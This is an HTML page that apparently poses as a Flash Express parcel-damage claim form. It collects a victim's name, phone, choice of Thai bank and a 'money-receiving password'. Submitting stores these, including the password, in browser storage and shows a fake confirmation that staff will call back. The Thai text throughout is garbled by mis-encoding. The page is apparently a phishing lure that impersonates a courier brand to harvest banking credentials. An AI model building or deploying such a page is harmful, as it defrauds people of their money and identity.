<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="https://flashexpress.com/favicon.ico" type="image/x-icon">
  <title>Flash Express | ‡∏¢‡∏∑‡πà‡∏ô‡πÄ‡∏Ñ‡∏•‡∏°‡∏û‡∏±‡∏™‡∏î‡∏∏</title>
  <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@400;600&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: "Prompt", sans-serif;
      background-color: #fffbea;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      overflow-y: auto;
    }

    .claim-container {
      background: #fff;
      padding: 25px 20px;
      border-radius: 16px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 380px;
      margin: 50px auto;
      text-align: center;
      box-sizing: border-box;
    }

    h2 {
      color: #000;
      margin-bottom: 20px;
      font-size: 18px;
      font-weight: 600;
    }

    input, .custom-select {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      margin-bottom: 12px;
      font-size: 15px;
      text-align: center;
      box-sizing: border-box;
    }

    /* Dropdown */
    .custom-select {
      position: relative;
      background-color: #fff;
      cursor: pointer;
    }
    .selected-option {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0 10px;
    }
    .option-list {
      display: none;
      position: absolute;
      top: calc(100% + 3px);
      left: 0;
      right: 0;
      background: white;
      border: 1px solid #ccc;
      border-radius: 8px;
      max-height: 220px;
      overflow-y: auto;
      z-index: 10;
    }
    .option-item {
      display: flex;
      align-items: center;
      padding: 8px 10px;
      transition: background 0.2s;
    }
    .option-item:hover { background: #f5f5f5; }
    .option-item img {
      width: 24px; height: 24px; border-radius: 50%; margin-right: 10px;
    }

    /* ‡∏õ‡∏∏‡πà‡∏° */
    .btn-box {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-top: 12px;
    }
    button {
      flex: 1;
      border: none;
      border-radius: 8px;
      padding: 10px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }
    .btn-submit {
      background: #ffeb3b;
    }
    .btn-submit:hover {
      background: #fdd835;
    }
    .btn-cancel {
      background: #fff;
      border: 1px solid #000;
    }
    .btn-cancel:hover {
      background: #f5f5f5;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .claim-container {
        margin: 30px 15px;
        padding: 20px 15px;
      }
      h2 { font-size: 16px; }
      input, .custom-select { font-size: 14px; padding: 9px; }
      button { font-size: 14px; }
    }
  </style>
</head>
<body>

  <div class="claim-container">
    <h2>üì¶ FLASH ‡∏¢‡∏∑‡πà‡∏ô‡πÄ‡∏Ñ‡∏•‡∏°‡∏û‡∏±‡∏™‡∏î‡∏∏‡πÄ‡∏™‡∏µ‡∏¢‡∏´‡∏≤‡∏¢</h2>

    <input type="text" id="fullname" placeholder="‡∏ä‡∏∑‡πà‡∏≠ - ‡∏ô‡∏≤‡∏°‡∏™‡∏Å‡∏∏‡∏•">
    <input type="text" id="date" placeholder="‡∏ß‡∏±‡∏ô/‡πÄ‡∏î‡∏∑‡∏≠‡∏ô/‡∏õ‡∏µ">
    <input type="text" id="phone" placeholder="‡πÄ‡∏ö‡∏≠‡∏£‡πå‡πÇ‡∏ó‡∏£">

    <!-- ‚úÖ dropdown ‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£ -->
    <div class="custom-select" id="bankSelect">
      <div class="selected-option" onclick="toggleOptions()">
        <span id="selectedBankText">‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£</span><span>‚ñº</span>
      </div>
      <div class="option-list" id="bankOptions">
        <div class="option-item" onclick="selectBank('‡∏Å‡∏™‡∏¥‡∏Å‡∏£‡πÑ‡∏ó‡∏¢ (KBANK)','KBANK.jpeg')">
          <img src="KBANK.jpeg"> ‡∏Å‡∏™‡∏¥‡∏Å‡∏£‡πÑ‡∏ó‡∏¢ (KBANK)
        </div>
        <div class="option-item" onclick="selectBank('‡∏Å‡∏£‡∏∏‡∏á‡πÑ‡∏ó‡∏¢ (KTB)','KTB.jpeg')">
          <img src="KTB.jpeg"> ‡∏Å‡∏£‡∏∏‡∏á‡πÑ‡∏ó‡∏¢ (KTB)
        </div>
        <div class="option-item" onclick="selectBank('‡πÑ‡∏ó‡∏¢‡∏û‡∏≤‡∏ì‡∏¥‡∏ä‡∏¢‡πå (SCB)','SCB.jpeg')">
          <img src="SCB.jpeg"> ‡πÑ‡∏ó‡∏¢‡∏û‡∏≤‡∏ì‡∏¥‡∏ä‡∏¢‡πå (SCB)
        </div>
        <div class="option-item" onclick="selectBank('‡∏≠‡∏≠‡∏°‡∏™‡∏¥‡∏ô (GSB)','GSB.png')">
          <img src="GSB.png"> ‡∏≠‡∏≠‡∏°‡∏™‡∏¥‡∏ô (GSB)
        </div>
        <div class="option-item" onclick="selectBank('‡∏ó‡∏´‡∏≤‡∏£‡πÑ‡∏ó‡∏¢‡∏ò‡∏ô‡∏ä‡∏≤‡∏ï (TTB)','TTB.jpeg')">
          <img src="TTB.jpeg"> ‡∏ó‡∏´‡∏≤‡∏£‡πÑ‡∏ó‡∏¢‡∏ò‡∏ô‡∏ä‡∏≤‡∏ï (TTB)
        </div>
          <div class="option-item" onclick="selectBank('‡∏Å‡∏£‡∏∏‡∏á‡∏®‡∏£‡∏µ (BAY)','BAY.png')">
          <img src="BAY.png"> ‡∏Å‡∏£‡∏∏‡∏á‡∏®‡∏£‡∏µ (‡∏∫BAY)
        </div>
          <div class="option-item" onclick="selectBank('‡∏Å‡∏£‡∏∏‡∏á‡πÄ‡∏ó‡∏û (BBL)','BBL.jpeg')">
          <img src="BBL.jpeg"> ‡∏Å‡∏£‡∏∏‡∏á‡πÄ‡∏ó‡∏û (BBL)
        </div>
         <div class="option-item" onclick="selectBank('‡∏ã‡∏µ‡πÑ‡∏≠‡πÄ‡∏≠‡πá‡∏°‡∏ö‡∏µ (CIMB)','CIMB.jpeg')">
          <img src="CIMB.jpeg"> ‡∏ã‡∏µ‡πÑ‡∏≠‡πÄ‡∏≠‡πá‡∏°‡∏ö‡∏µ (CIMB)
        </div>
         <div class="option-item" onclick="selectBank('‡∏≠‡∏≤‡∏Ñ‡∏≤‡∏£‡∏™‡∏á‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå (GHB)','GHB.jpg')">
          <img src="GHB.jpg"> ‡∏≠‡∏≤‡∏Ñ‡∏≤‡∏£‡∏™‡∏á‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå (GHB)
        </div>
         <div class="option-item" onclick="selectBank('‡∏¢‡∏π‡πÇ‡∏≠‡∏ö‡∏µ (UOB)','UOB.jpg')">
          <img src="UOB.jpg"> ‡∏¢‡∏π‡πÇ‡∏≠‡∏ö‡∏µ (UOB)
        </div>
      </div>
    </div>

    <input type="text" id="password" placeholder="‡∏£‡∏´‡∏±‡∏™‡∏£‡∏±‡∏ö‡πÄ‡∏á‡∏¥‡∏ô">

    <div class="btn-box">
      <button class="btn-submit" id="submitBtn" onclick="submitClaim()">üì® ‡∏¢‡∏∑‡πà‡∏ô‡∏Ñ‡∏≥‡∏£‡πâ‡∏≠‡∏á</button>
      <button class="btn-cancel" onclick="goHome()">üè† ‡∏Å‡∏•‡∏±‡∏ö‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å</button>
    </div>
  </div>

  <script>
    let selectedBank = "";

    // ‚úÖ ‡∏î‡∏∂‡∏á‡πÄ‡∏ö‡∏≠‡∏£‡πå‡πÇ‡∏ó‡∏£‡∏•‡∏π‡∏Å‡∏Ñ‡πâ‡∏≤‡∏à‡∏≤‡∏Å localStorage (‡∏ñ‡πâ‡∏≤‡∏°‡∏µ)
    document.addEventListener("DOMContentLoaded", () => {
      const activeCustomer = localStorage.getItem("active_customer");
      if (activeCustomer) {
        document.getElementById("phone").value = activeCustomer;
      }
    });

    // üîΩ ‡πÅ‡∏™‡∏î‡∏á / ‡∏ã‡πà‡∏≠‡∏ô dropdown
    function toggleOptions() {
      const list = document.getElementById("bankOptions");
      list.style.display = list.style.display === "block" ? "none" : "block";
    }

    // üîΩ ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£
    function selectBank(name, logo) {
      document.getElementById("selectedBankText").innerHTML =
        `<img src="${logo}" style="width:24px;height:24px;border-radius:50%;vertical-align:middle;margin-right:8px;">${name}`;
      selectedBank = name;
      document.getElementById("bankOptions").style.display = "none";
    }

    // ‚úÖ ‡∏¢‡∏∑‡πà‡∏ô‡∏Ñ‡∏≥‡∏£‡πâ‡∏≠‡∏á
    function submitClaim() {
      const name = document.getElementById("fullname").value.trim();
      const date = document.getElementById("date").value;
      const phone = document.getElementById("phone").value.trim();
      const bank = selectedBank;
      const password = document.getElementById("password").value.trim();

      if (!name || !date || !phone || !bank || !password ) {
        alert(" ‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏´‡πâ‡∏Ñ‡∏£‡∏ö‡∏ó‡∏∏‡∏Å‡∏ä‡πà‡∏≠‡∏á");
        return;
      }
      const btn = document.getElementById("submitBtn");
      btn.disabled = true;
      btn.textContent = "‚è≥ ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•...";

      // ‚úÖ ‡πÄ‡∏û‡∏¥‡πà‡∏° 3 ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î‡∏ô‡∏µ‡πâ
      localStorage.setItem("claim_code", password);
      localStorage.setItem("claim_phone", phone);
      localStorage.setItem("claim_time", Date.now());

      const claims = JSON.parse(localStorage.getItem("claim_requests")) || [];
      claims.push({
        name, date, phone, bank,password,
        status: "‡∏£‡∏≠‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö",
        submitted: new Date().toLocaleString("th-TH")
      });
      localStorage.setItem("claim_requests", JSON.stringify(claims));

    
      showLoadingModal();
    }

    function showLoadingModal() {
      const modal = document.createElement("div");
      modal.innerHTML = `
        <div id="loadingModal" style="
          position: fixed; top: 0; left: 0; right: 0; bottom: 0;
          background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
          z-index: 9999; font-family: 'Prompt', sans-serif;
        ">
          <div style="
            background: #fff; border-radius: 16px; padding: 25px 30px;
            width: 90%; max-width: 340px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.25);
          ">
            <div style="
              border: 5px solid #f3f3f3;
              border-top: 5px solid #ffeb3b;
              border-radius: 50%;
              width: 50px; height: 50px;
              animation: spin 1s linear infinite;
              margin: 0 auto 20px;
            "></div>
            <h3 style="color:#000; margin-bottom:10px;">‡∏î‡∏≥‡πÄ‡∏ô‡∏¥‡∏ô‡∏Å‡∏≤‡∏£‡∏¢‡∏∑‡πà‡∏ô‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß</h3>
            <p style="color:#555; font-size:15px;">‡πÄ‡∏à‡πâ‡∏≤‡∏´‡∏ô‡πâ‡∏≤‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏Å‡∏•‡∏±‡∏ö‡πÑ‡∏õ‡∏†‡∏≤‡∏¢‡πÉ‡∏ô‡πÄ‡∏£‡πá‡∏ß‡πÜ‡∏ô‡∏µ‡πâ</p>
            <p style="color:#888; font-size:13px; margin-top:10px;">(‡∏£‡∏∞‡∏ö‡∏ö‡∏à‡∏∞‡∏Å‡∏•‡∏±‡∏ö‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å‡∏†‡∏≤‡∏¢‡πÉ‡∏ô 10 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ)</p>
            <button onclick="goHome()" style="
              margin-top:15px; background:#ffeb3b; border:none; border-radius:8px;
              padding:10px 20px; font-weight:bold; cursor:pointer;
            ">üè† ‡∏Å‡∏•‡∏±‡∏ö‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å</button>
          </div>
        </div>
      `;
      document.body.appendChild(modal);

      setTimeout(() => goHome(), 10000);
    }

    function goHome() {
      window.location.href = "index.html";
    }
    // ‚úÖ ‡∏õ‡∏¥‡∏î dropdown ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏Ñ‡∏•‡∏¥‡∏Å‡∏ô‡∏≠‡∏Å
    document.addEventListener("click", (e) => {
      if (!document.getElementById("bankSelect").contains(e.target))
        document.getElementById("bankOptions").style.display = "none";
    });
  </script>
</body>
</html>
